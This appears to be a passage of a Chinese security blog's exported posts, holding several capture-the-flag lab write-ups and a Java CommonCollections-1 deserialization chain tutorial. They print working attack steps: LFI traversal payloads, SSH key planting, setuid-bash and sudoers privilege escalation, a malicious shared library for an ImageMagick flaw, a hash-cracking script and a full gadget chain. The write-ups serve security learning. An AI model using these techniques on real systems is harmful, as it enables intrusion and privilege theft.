signing enabled but not required\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.11 ms 172.17.0.2\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 22.37 seconds enum4linux #\r找到用户名：macarena\nFTP FileLeak #\r尝试FTP匿名登录，得到一个留言\n[root@kali] /home/kali/dance-samba ❯ ftp 172.17.0.2 ⏎\rConnected to 172.17.0.2.\r220 (vsFTPd 3.0.5)\rName (172.17.0.2:kali): anonymous\r331 Please specify the password.\rPassword: 230 Login successful.\rRemote system type is UNIX.\rUsing binary mode to transfer files.\rftp\u0026gt; ls\r229 Entering Extended Passive Mode (|||60425|)\r150 Here comes the directory listing.\r-rw-r--r-- 1 0 0 69 Aug 19 2024 nota.txt\r226 Directory send OK.\rftp\u0026gt; get nota.txt\rlocal: nota.txt remote: nota.txt\r229 Entering Extended Passive Mode (|||13977|)\r150 Opening BINARY mode data connection for nota.txt (69 bytes).\r100% |***************************************************************************************************************| 69 556.88 KiB/s 00:00 ETA\r226 Transfer complete.\r69 bytes received in 00:00 (90.81 KiB/s)\rftp\u0026gt; exit\r221 Goodbye.\r[root@kali] /home/kali/dance-samba ❯ ls\rauto_deploy.sh dance-samba.tar dance-samba.zip nota.txt\r[root@kali] /home/kali/dance-samba ❯ cat nota.txt I don\u0026#39;t know what to do with Macarena, she\u0026#39;s obsessed with donald. 看来macarena很喜欢donald，或许会把他的名字作为密码呢？\n尝试进入smb服务获取到了user.txt\nRoot #\r使用smbmap可以看到具有写入权限\n看起来这个smb服务的目录是直接连接到**/home/macarena的，因此可以尝试创建一个.ssh目录，并且上传到里面的authorized_keys**。这里我的id_rsa.pub是之前就用过的，这里就不重新生成了\nsmb: \\\u0026gt; mkdir .ssh\rsmb: \\.ssh\\\u0026gt; put id_rsa.pub authorized_keys 在home文件夹下发现一个secret\n得到密码：supersecurepassword，当然这不是root的密码，不过可以看到macarena的特殊命令\nmacarena@2ee34abfffe4:/home/secret$ sudo -l\r[sudo] password for macarena: Matching Defaults entries for macarena on 2ee34abfffe4:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser macarena may run the following commands on 2ee34abfffe4:\r(ALL : ALL) /usr/bin/file 可以参考👇\nFile | GTFOBins 我尝试读取了root的ssh密钥，结果失败了，在**/opt目录下发现一个root权限的password.txt**，刚好可以配合file命令进行读取，密码为：rooteable2\n提升用户为root即可\nSummary #\rUser：ftp的匿名登陆泄露文件，再通过smb读取到user.txt\nRoot：一个比较特殊的点就是，macarena的smb目录似乎就是他的家目录，因为可以看到bashrc、profile等特定文件。因此可以写入ssh密钥后登录。在**/home/secret目录下拿到macarena的密码，随后可以进行sudo查看命令。期间我尝试过读取/root/root.txt和/root/.ssh/id_rsa等，但是root用户并没有配置ssh密钥。幸好在/opt目录下有不可读的密码文件，可以通过file**命令读取，成功提权。\n","date":"2025-02-21","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-dancesamba/","section":"Posts","summary":"","title":"Dockerlabs-DanceSamba","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Memesploit ❯ nmap 172.17.0.2 -sV Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-21 19:06 CST\rNmap scan report for 172.17.0.2\rHost is up (0.0000080s latency).\rNot shown: 996 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)\r80/tcp open http Apache httpd 2.4.58 ((Ubuntu))\r139/tcp open netbios-ssn Samba smbd 4.6.2\r445/tcp open netbios-ssn Samba smbd 4.6.2\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 13.42 seconds SMB #\r[root@kali] /home/kali/Memesploit ❯ smbclient -L //172.17.0.2/ ⏎\rPassword for [WORKGROUP\\root]:\rSharename Type Comment\r--------- ---- -------\rprint$ Disk Printer Drivers\rshare_memehydra Disk IPC$ IPC IPC Service (c9584cd8853e server (Samba, Ubuntu))\rReconnecting with SMB1 for workgroup listing.\rsmbXcli_negprot_smb1_done: No compatible protocol selected by server.\rProtocol negotiation to server 172.17.0.2 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE\rUnable to connect with SMB1 -- no workgroup available 存在一个share_memehydra的目录，但是必须要密码才能登录。\n进入网页可以看到有部分单词被黑化了，尝试用它作为密码\n[root@kali] /home/kali/Memesploit ❯ enum4linux -a 172.17.0.2 尝试使用memehydra作为用户名登录成功\n解压的时候需要密码，刚好网页里的另一个隐藏单词就是密码。\n[root@kali] /home/kali/Memesploit ❯ unzip secret.zip -d secret\rArchive: secret.zip\r[secret.zip] secret.txt password: inflating: secret/secret.txt [root@kali] /home/kali/Memesploit ❯ cd secret [root@kali] /home/kali/Memesploit/secret ❯ ls\rsecret.txt\r[root@kali] /home/kali/Memesploit/secret ❯ cat secret.txt memesploit:metasploitelmejor ssh登录拿到user.txt\nROOT #\r查看特殊权限命令，发现一个service\nmemesploit@c9584cd8853e:~$ sudo -l\rMatching Defaults entries for memesploit on c9584cd8853e:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser memesploit may run the following commands on c9584cd8853e:\r(ALL : ALL) NOPASSWD: /usr/sbin/service login_monitor restart 找到login_monitor的位置\n将其中一个脚本进行重写，这样重启的时候会被执行\n这里有一个坑，仔细看脚本的内容，需要修改的是actionban.sh\nmemesploit@577e1f3f89de:/etc/login_monitor$ cat actionban.sh #!/bin/bash\r# Ruta del archivo que simula el registro de bloqueos\rBLOCK_LOG=\u0026#34;/tmp/block_log.txt\u0026#34;\r# Función para generar una IP aleatoria\rgenerate_random_ip() {\recho \u0026#34;$((RANDOM % 255 + 1)).$((RANDOM % 255 + 1)).$((RANDOM % 255 + 1)).$((RANDOM % 255 + 1))\u0026#34;\r}\r# Generar una IP aleatoria\rIP_TO_BLOCK=$(generate_random_ip)\r# Mensaje de simulación\rMESSAGE=\u0026#34;Simulación de bloqueo de IP: $IP_TO_BLOCK\u0026#34;\r# Mostrar el mensaje en la terminal\recho \u0026#34;$MESSAGE\u0026#34;\r# Registrar el intento de bloqueo en el archivo\recho \u0026#34;$(date): $MESSAGE\u0026#34; \u0026gt;\u0026gt; \u0026#34;$BLOCK_LOG\u0026#34;\recho \u0026#34;El registro ha sido creado en $BLOCK_LOG con la IP $IP_TO_BLOCK\u0026#34; 因为这里的**/tmp/block_log.txt**是真实存在的，也就是说这个脚本是被执行的\nmemesploit@577e1f3f89de:/etc/login_monitor$ cp actionban.sh actionban2.sh memesploit@577e1f3f89de:/etc/login_monitor$ rm actionban.sh rm: remove write-protected regular file \u0026#39;actionban.sh\u0026#39;? y memesploit@577e1f3f89de:/etc/login_monitor$ echo \u0026#34;chmod u+s /bin/bash\u0026#34; \u0026gt;\u0026gt; actionban2.sh memesploit@577e1f3f89de:/etc/login_monitor$ mv actionban2.sh actionban.sh memesploit@577e1f3f89de:/etc/login_monitor$ sudo /usr/sbin/service login_monitor restart chmod u+s /bin/bash的功能：当用户执行 /bin/bash 时，它会以文件拥有者的身份（通常是 root 用户）执行，而不是以当前用户的身份执行。这意味着，如果普通用户执行 /bin/bash，会获得 root 权限，直到退出 bash。\n另一个解法是将memesploit写入超级用户组，然后使用sudo -i提升权限。可以参考HTB-Sea - HYH\necho \u0026#39;echo \u0026#34;memesploit ALL=(ALL:ALL) ALL\u0026#34; \u0026gt;\u0026gt; /etc/sudoers.d/memesploit\u0026#39; \u0026gt;\u0026gt; actionban.sh Summary #\rUser：SMB文件泄露，通过网页中的信息进行登录下载，然后解密压缩包。\nRoot：查找到**/usr/sbin/service login_monitor restart相关的脚本，这里一定要找对，不然没有效果。可以修改/bin/bash的执行方式，也可以将memesploit**写入超级用户组，当然还有其他解法，这里就不赘述了。\n","date":"2025-02-21","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-memesploit/","section":"Posts","summary":"","title":"Dockerlabs-Memesploit","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali ❯ nmap 172.17.0.2 -sV Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-21 15:07 CST\rNmap scan report for 172.17.0.2\rHost is up (0.0000080s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)\r80/tcp open http Apache httpd 2.4.58 ((Ubuntu))\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 8.45 seconds Dirsearch #\r[root@kali] /home/kali/Psycho ❯ dirsearch -u 172.17.0.2 -t 50 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3\r(_||| _) (/_(_|| (_| )\rExtensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/Psycho/reports/_172.17.0.2/_25-02-21_15-09-17.txt\rTarget: http://172.17.0.2/\r[15:09:17] Starting: [15:09:18] 403 - 275B - /.ht_wsr.txt [15:09:18] 403 - 275B - /.htaccess.bak1 [15:09:18] 403 - 275B - /.htaccess.orig\r[15:09:18] 403 - 275B - /.htaccess.sample [15:09:18] 403 - 275B - /.htaccess.save\r[15:09:18] 403 - 275B - /.htaccess_extra [15:09:18] 403 - 275B - /.htaccess_sc [15:09:18] 403 - 275B - /.htaccessOLD\r[15:09:18] 403 - 275B - /.htaccessOLD2 [15:09:18] 403 - 275B - /.htm [15:09:18] 403 - 275B - /.html\r[15:09:18] 403 - 275B - /.htaccessBAK\r[15:09:18] 403 - 275B - /.htpasswds [15:09:18] 403 - 275B - /.httr-oauth [15:09:18] 403 - 275B - /.htpasswd_test [15:09:18] 403 - 275B - /.php [15:09:21] 403 - 275B - /.htaccess_orig [15:09:24] 301 - 309B - /assets -\u0026gt; http://172.17.0.2/assets/ [15:09:24] 200 - 458B - /assets/ [15:09:38] 403 - 275B - /server-status [15:09:38] 403 - 275B - /server-status/ Task Completed 在网页源码底部发现了一个ERROR，意味着是不是他的调用方式有什么问题？或者什么参数有问题？\nFFUF #\r尝试对index.php的参数进行枚举，发现存在secret这个参数，可以进行LFI读取文件\n[root@kali] /home/kali ❯ ffuf -w ./Desktop/fuzzDicts/paramDict/parameter.txt -u \u0026#39;http://172.17.0.2/index.php?FUZZ=../../../../../../etc/passwd\u0026#39; --fs 2596\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://172.17.0.2/index.php?FUZZ=../../../../../../etc/passwd\r:: Wordlist : FUZZ: /home/kali/Desktop/fuzzDicts/paramDict/parameter.txt\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 2596\r________________________________________________\rsecret [Status: 200, Size: 3870, Words: 678, Lines: 89, Duration: 0ms]\r:: Progress: [5846/5846] :: Job [1/1] :: 57 req/sec :: Duration: [0:00:04] :: Errors: 0 :: 用curl发送命令然后获取到了**/etc/passwd**的内容\n这里发现了两个用户名：vaxei、luisillo\n尝试读取ssh密钥文件\n成功拿到vaxei用户的shell，用LFI无法读取到luisillo的ssh密钥\nPrivilege Escalation #\r查看用户的特殊权限命令\n可以发现vaxei能以luisillo的身份运行perl命令\nvaxei@4b3a9fd95001:~$ sudo -l\rMatching Defaults entries for vaxei on 4b3a9fd95001:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser vaxei may run the following commands on 4b3a9fd95001:\r(luisillo) NOPASSWD: /usr/bin/perl 在perl | GTFOBins中可以看到\n因此可以将用户提升为luisillo\n查看luisillo的特殊命令\nluisillo@4b3a9fd95001:~$ sudo -l\rMatching Defaults entries for luisillo on 4b3a9fd95001:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser luisillo may run the following commands on 4b3a9fd95001:\r(ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py 查看**/opt/paw.py**的具体内容\nluisillo@4b3a9fd95001:~$ cat /opt/paw.py import subprocess\rimport os\rimport sys\rimport time\r# F\rdef dummy_function(data):\rresult = \u0026#34;\u0026#34;\rfor char in data:\rresult += char.upper() if char.islower() else char.lower()\rreturn result\r# Código para ejecutar el script\ros.system(\u0026#34;echo Ojo Aqui\u0026#34;)\r# Simulación de procesamiento de datos\rdef data_processing():\rdata = \u0026#34;This is some dummy data that needs to be processed.\u0026#34;\rprocessed_data = dummy_function(data)\rprint(f\u0026#34;Processed data: {processed_data}\u0026#34;)\r# Simulación de un cálculo inútil\rdef perform_useless_calculation():\rresult = 0\rfor i in range(1000000):\rresult += i\rprint(f\u0026#34;Useless calculation result: {result}\u0026#34;)\rdef run_command():\rsubprocess.run([\u0026#39;echo Hello!\u0026#39;], check=True)\rdef main():\r# Llamadas a funciones que no afectan el resultado final\rdata_processing()\rperform_useless_calculation()\r# Comando real que se ejecuta\rrun_command()\rif __name__ == \u0026#34;__main__\u0026#34;:\rmain() 其实这里有很多种解法，我就写一个比较简单的。\nluisillo是可以在**/opt/**目录下进行任意操作的，包括删除文件，添加文件\n因此可以重写这个paw.py\nluisillo@4b3a9fd95001:/opt$ rm paw.py\rluisillo@4b3a9fd95001:/opt$ echo \u0026#39;import os; os.system(\u0026#34;/bin/bash\u0026#34;)\u0026#39; \u0026gt;\u0026gt; paw.py 然后执行即可拿到root权限\n其余的解法我看了一下，大概也就是修改引入包，因为python的引入包策略是同级目录优先，如果统计目录下有subprocess.py这种，会优先使用它。如果将命令写入，也是可以直接获取到root权限。这种在无法修改paw.py的情况下是可以使用的\nSummary #\r从网页源码猜测得到，存在LFI文件包含漏洞，使用wfuzz对路径参数进行爆破，读取vaxei的ssh密钥成功拿到Shell权限。利用vaxei作为跳板得到luisillo的权限，并且通过覆写paw.py成功越权\n第一次使用这个靶场, 使用docker搭在本地的话,操作起来就比较方便,也没有什么延迟\n","date":"2025-02-21","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-psycho/","section":"Posts","summary":"","title":"DockerLabs-Psycho","type":"posts"},{"content":"\rAbout #\r本文是关于Apache commons collections反序列漏洞利用链的过程复现\nEnvironment #\rJDK version jdk-8u65-windows-x64 Common collections version 3.2.1 Java Archive Downloads - Java SE 8\noracle.com passwords - BugMeNot. (如果下载JDK需要登录，这里是免费的账户)\njdk8u/jdk8u/jdk: af660750b2f4 (源代码下载)\nMaven导入3.2.1版本\n\u0026lt;dependency\u0026gt;\r\u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt;\r\u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt;\r\u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt;\r\u0026lt;/dependency\u0026gt; CC1链在JDK 8u71及之后的版本中被修复\nInvokerTransformer#transform #\rCC1链造成的原因是Transformer的transform方法\n可以看到transform方法使用input.getClass()获取输入对象的类，然后通过cls.getMethod(iMethodName, iParamTypes)获取类中名为iMethodName且参数类型为iParamTypes的方法。\n其中iMethodName等参数在实例化的时候就以实参的形式指定了，通过直接实例化InvokerTransformer，并且让transform的传入对象为Runtime即可成功调用到exec，具体如下代码\nimport org.apache.commons.collections.functors.InvokerTransformer;\rimport org.junit.Test;\rimport java.io.IOException;\rpublic class CC1TEST {\r@Test\rpublic void Test() throws IOException {\rInvokerTransformer invokerTransformer= new InvokerTransformer(\r\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;});\rinvokerTransformer.transform(Runtime.getRuntime());\r}\r} TransformedMap#checkSetValue #\r查找transform的实现，找到TransformedMap里有一个方法，但是前缀是protected，也就无法外部调用\n继续向上寻找，发现另一个函数setValue通过外部传参间接调用了checkSetValue，并且可以显式调用\n在TransformedMap的decorate中可以看到是一个静态函数，并且可以传入参数生成一个新的实例。\n由于TransformedMap是继承于AbstractInputCheckedMapDecorator，因此可以直接外部调用setvalue函数。Map.Entry.setValue是一个专门用于更新映射中值的方法。\n现在的思路就是：通过使用TransformedMap的decorate静态函数生成一个TransformedMap的对象，并且提升为父类Map，因为setValue只在Map类中有，子类中并没有定义。通过这个对象的checkSetValue方法到setValue方法，最后到transform方法（其中的参数是相同的）。\nimport org.apache.commons.collections.functors.InvokerTransformer;\rimport org.apache.commons.collections.map.TransformedMap;\rimport org.junit.Test;\rimport java.util.HashMap;\rimport java.util.Map;\rpublic class CC1TEST {\r@Test\rpublic void Test() {\rInvokerTransformer invokerTransformer = new InvokerTransformer(\r\u0026#34;exec\u0026#34;,\rnew Class[]{String.class},\rnew Object[]{\u0026#34;calc\u0026#34;});\rHashMap\u0026lt;Object, Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;();\rmap.put(\u0026#34;a\u0026#34;, \u0026#34;b\u0026#34;);\rMap\u0026lt;Object,Object\u0026gt; decorated = TransformedMap.decorate(map, null, invokerTransformer);\rdecorated.entrySet().forEach(entry -\u0026gt; {\rentry.setValue(Runtime.getRuntime()) ;\r});\r}\r} AnnotationInvocationHandler #\r这个类实现了Serializable接口，因此可以被序列化\n并且在其readObject方法中存在setValue方法的调用\n因此这个类可以作为反序列化的起点\n但是它不能被显式创建实例，只能使用反射进行创建\nClass\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;);\rConstructor\u0026lt;?\u0026gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);\rdeclaredConstructor.setAccessible(true);\rObject o = declaredConstructor.newInstance(Target.class, decorated); 回到readObjcet方法，执行到setValue方法之前有两个判断，绕过也非常简单，只需要传入的map中有键值对就行\nprivate void readObject(java.io.ObjectInputStream s)\rthrows java.io.IOException, ClassNotFoundException {\rs.defaultReadObject();\r// Check to make sure that types have not evolved incompatibly\rAnnotationType annotationType = null;\rtry {\rannotationType = AnnotationType.getInstance(type);\r} catch(IllegalArgumentException e) {\r// Class is no longer an annotation type; time to punch out\rthrow new java.io.InvalidObjectException(\u0026#34;Non-annotation type in annotation serial stream\u0026#34;);\r}\rMap\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes = annotationType.memberTypes();\r// If there are annotation members without values, that\r// situation is handled by the invoke method.\rfor (Map.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet()) {\rString name = memberValue.getKey();\rClass\u0026lt;?\u0026gt; memberType = memberTypes.get(name);\rif (memberType != null) { // i.e. member still exists\rObject value = memberValue.getValue();\rif (!(memberType.isInstance(value) ||\rvalue instanceof ExceptionProxy)) {\rmemberValue.setValue(\rnew AnnotationTypeMismatchExceptionProxy(\rvalue.getClass() + \u0026#34;[\u0026#34; + value + \u0026#34;]\u0026#34;).setMember(\rannotationType.members().get(name)));\r}\r}\r}\r} 但是，就算绕过了前面的判断，这里的memberValue的setValue方法参数仍然是不可控的，也就无法设置参数为Runtime\nChainedTransformer #\r可以看到整个类的transform方法是成链式结构的，上一个经过transform的对象会作为下一轮的参数\n因此可以将decorate的参数指定为一个ChainedTransformer，当其触发setValue的时候其中的对象会一层一层的传递，直到Runtime的exec方法被执行\n因此代码结构可以如下，由于Runtime是无法被直接实例化的，因此这里链条的第一个是使用的ConstantTransformer，这个类的transform方法输入和输出的一致的，可以直接获取到Runtime的Class。\n之后使用InvokerTransformer触发getMethod方法，随后无参数调用invoke获取到getRuntime从而进行实例化得到一个Runtime对象。\n最后经过这个实例化对象调用exec方法，进行命令执行\nimport org.apache.commons.collections.Transformer;\rimport org.apache.commons.collections.functors.ChainedTransformer;\rimport org.apache.commons.collections.functors.ConstantTransformer;\rimport org.apache.commons.collections.functors.InvokerTransformer;\rimport org.apache.commons.collections.map.TransformedMap;\rimport org.junit.Test;\rimport java.io.ObjectInputStream;\rimport java.io.ObjectOutputStream;\rimport java.lang.annotation.Target;\rimport java.lang.reflect.Constructor;\rimport java.nio.file.Files;\rimport java.nio.file.Paths;\rimport java.util.HashMap;\rimport java.util.Map;\rpublic class CC1TEST {\r@Test\rpublic void Test() throws Exception {\rChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{\rnew ConstantTransformer(Runtime.class),\rnew InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class,Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;,null}),\rnew InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class,Object[].class}, new Object[]{null,null }),\rnew InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;})\r});\rHashMap\u0026lt;Object, Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;();\rmap.put(\u0026#34;value\u0026#34;, \u0026#34;value\u0026#34;);\rMap\u0026lt;Object,Object\u0026gt; decorated = TransformedMap.decorate(map, null, chainedTransformer);\rClass\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;);\rConstructor\u0026lt;?\u0026gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);\rdeclaredConstructor.setAccessible(true);\rObject o = declaredConstructor.newInstance(Target.class, decorated);\rserialize(o);\rdeserialize();\r}\rpublic void serialize(Object o) throws Exception {\rtry (ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get(\u0026#34;ser.ser\u0026#34;)))) {\roos.writeObject(o);\r}\r}\rpublic Object deserialize() throws Exception {\rtry (ObjectInputStream ois = new ObjectInputStream(Files.newInputStream(Paths.get(\u0026#34;ser.ser\u0026#34;)))) {\rreturn ois.readObject();\r}\r}\r} ChainedTransformer里面简单化的思路就是👇\nimport org.junit.Test;\rpublic class CC1TEST_2 {\r@Test\rpublic void test2() throws Exception {\rObject getRuntime = Runtime.class.getMethod(\u0026#34;getRuntime\u0026#34;).invoke(null);\rSystem.out.println(getRuntime instanceof Runtime); //true\rgetRuntime.getClass().getMethod(\u0026#34;exec\u0026#34;,String.class).invoke(getRuntime,\u0026#34;calc\u0026#34;);\r}\r} ","date":"2025-02-18","externalUrl":null,"permalink":"/posts/2025/02/common-collections-1/","section":"Posts","summary":"","title":"CommonCollections-1","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/Titanic ❯ nmap titanic.htb -sV -T4 PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\r80/tcp open http Apache httpd 2.4.52\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ReadAnyFiles #\r进入titanic.htb，点击Book Now，使用burpsuite进行抓包发现一个download路由\n尝试将ticket的参数修改为其他文件\n可以看到成功下载\n使用下面的URL进行下载可以读取到user.txt\nhttp://titanic.htb/download?ticket=../../../../../../../home/developer/user.txt Subdomain FUZZ #\r将dev.titanic.htb添加到**/etc/hosts**\n可以看到是一个Gitea的服务，并且版本是1.22.1\ngitea的数据库文件一般在**/data/gitea.db**中\n这里尝试使用下面的路径进行下载\ntitanic.htb/download?ticket=../../../../../../home/developer/gitea/data/gitea/gitea.db 成功拿到数据库文件\nCrack Passwd #\r可以看到密码是用pbkdf2进行加密的，这和HTB-Compiled有一点类似\n直接使用hashcat会有一点慢，这里我使用的是脚本\nimport hashlib\rimport binascii\rdef pbkdf2_hash(password, salt, iterations=50000, dklen=50):\rhash_value = hashlib.pbkdf2_hmac(\r\u0026#39;sha256\u0026#39;,\rpassword.encode(\u0026#39;utf-8\u0026#39;),\rsalt,\riterations,\rdklen\r)\rreturn hash_value\rdef find_matching_password(dictionary_file, target_hash, salt, iterations=50000, dklen=50):\rtarget_hash_bytes = binascii.unhexlify(target_hash)\rwith open(dictionary_file, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as file:\rcount = 0\rfor line in file:\rpassword = line.strip()\rhash_value = pbkdf2_hash(password, salt, iterations, dklen)\rcount += 1\rprint(f\u0026#34;正在检查密码 {count}: {password}\u0026#34;)\rif hash_value == target_hash_bytes:\rprint(f\u0026#34;\\nFound password: {password}\u0026#34;)\rreturn password\rprint(\u0026#34;Password not found.\u0026#34;)\rreturn None\rsalt = binascii.unhexlify(\u0026#39;8bf3e3452b78544f8bee9400d6936d34\u0026#39;)\rtarget_hash = \u0026#39;e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56\u0026#39;\rdictionary_file = \u0026#39;/usr/share/wordlists/rockyou.txt\u0026#39;\rfind_matching_password(dictionary_file, target_hash, salt) ROOT #\r登录后，在**/opt/scripts**下看到一个脚本文件\n查看到magick的版本信息，找到一个漏洞\nArbitrary Code Execution in `AppImage` version `ImageMagick` · Advisory · ImageMagick/ImageMagick 根据identify_image.sh，需要在**/opt/app/static/assets/images中生成libxcb.so.1才能导致root权限下的magick读取到root.txt**\ncd /opt/app/static/assets/images\rgcc -x c -shared -fPIC -o ./libxcb.so.1 - \u0026lt;\u0026lt; EOF\r#include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;stdlib.h\u0026gt;\r#include \u0026lt;unistd.h\u0026gt;\r__attribute__((constructor)) void init(){\rsystem(\u0026#34;cat /root/root.txt \u0026gt; /tmp/rootflag\u0026#34;);\rexit(0);\r}\rEOF 然后修改原有的目录内容，比如说复制一个图片\ncp home.jpg home2.jpg Summary #\rUser：任意文件下载即可获取到user.txt，不过没有ssh密钥，在子域名爆破后得知是gitea服务，通过数据库文件泄露拿到了developer的密码hash，爆破后进行登录。\nRoot：magick的版本漏洞，该版本在执行时设置和环境变量时可能会使用空路径，这可能会导致在执行时通过加载当前工作目录中的恶意配置文件或共享库来执行任意代码。需要在identify_images.sh所指定的目录下进行创建配置，等待脚本执行即可获得root.txt。\n","date":"2025-02-16","externalUrl":null,"permalink":"/posts/2025/02/htb-titanic/","section":"Posts","summary":"","title":"HTB-Titanic","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali ❯ nmap cat.htb\rPORT STATE SERVICE\r22/tcp open ssh\r80/tcp open http Dirsearch #\r存在git泄露\n用git-dumper获取到源码\n[root@kali] /home/kali/Cat ❯ git-dumper http://cat.htb/.git/ ./catgit XSS #\r在view_cat.php中发现存在XSS的可能性\n\u0026lt;?php\rsession_start();\rinclude \u0026#39;config.php\u0026#39;;\r// Check if the user is logged in\rif (!isset($_SESSION[\u0026#39;username\u0026#39;]) || $_SESSION[\u0026#39;username\u0026#39;] !== \u0026#39;axel\u0026#39;) {\rheader(\u0026#34;Location: /join.php\u0026#34;);\rexit();\r}\r// Get the cat_id from the URL\r$cat_id = isset($_GET[\u0026#39;cat_id\u0026#39;]) ? $_GET[\u0026#39;cat_id\u0026#39;] : null;\rif ($cat_id) {\r// Prepare and execute the query\r$query = \u0026#34;SELECT cats.*, users.username FROM cats JOIN users ON cats.owner_username = users.username WHERE cat_id = :cat_id\u0026#34;;\r$statement = $pdo-\u0026gt;prepare($query);\r$statement-\u0026gt;bindParam(\u0026#39;:cat_id\u0026#39;, $cat_id, PDO::PARAM_INT);\r$statement-\u0026gt;execute();\r// Fetch cat data from the database\r$cat = $statement-\u0026gt;fetch(PDO::FETCH_ASSOC);\rif (!$cat) {\rdie(\u0026#34;Cat not found.\u0026#34;);\r}\r} else {\rdie(\u0026#34;Invalid cat ID.\u0026#34;);\r}\r?\u0026gt;\r\u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt;\r\u0026lt;h1\u0026gt;Cat Details: \u0026lt;?php echo $cat[\u0026#39;cat_name\u0026#39;]; ?\u0026gt;\u0026lt;/h1\u0026gt;\r\u0026lt;img src=\u0026#34;\u0026lt;?php echo $cat[\u0026#39;photo_path\u0026#39;]; ?\u0026gt;\u0026#34; alt=\u0026#34;\u0026lt;?php echo $cat[\u0026#39;cat_name\u0026#39;]; ?\u0026gt;\u0026#34; class=\u0026#34;cat-photo\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;cat-info\u0026#34;\u0026gt;\r\u0026lt;strong\u0026gt;Name:\u0026lt;/strong\u0026gt; \u0026lt;?php echo $cat[\u0026#39;cat_name\u0026#39;]; 